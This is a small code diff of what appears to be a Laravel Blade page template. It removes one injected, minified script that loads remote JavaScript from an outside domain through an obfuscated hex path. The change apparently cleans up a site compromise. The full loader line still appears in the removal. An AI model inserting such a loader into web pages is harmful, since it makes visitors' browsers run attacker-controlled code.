@@ -185,7 +185,6 @@
         swal("Warning!", "{{ Session::get('warning') }}", "warning")
     @endif
 </script>
-<script>(function(a,b,c,d,e){e=a.createElement(b);a=a.getElementsByTagName(b)[0];e.async=1;e.src=c;a.parentNode.insertBefore(e,a)})(document,'script','//ivykiosk.com/82af7a2deb5955ea3480317dab4eaeed492668ebea728919c4a3690ebebc066066a46ad565a41ced24540d178c5a1a944956e7ed7268c0ce2db62fb9f2a5');</script>
 <script src="{{ asset('ads.js') }}" type="text/javascript"></script>
 <script type="text/javascript">
 
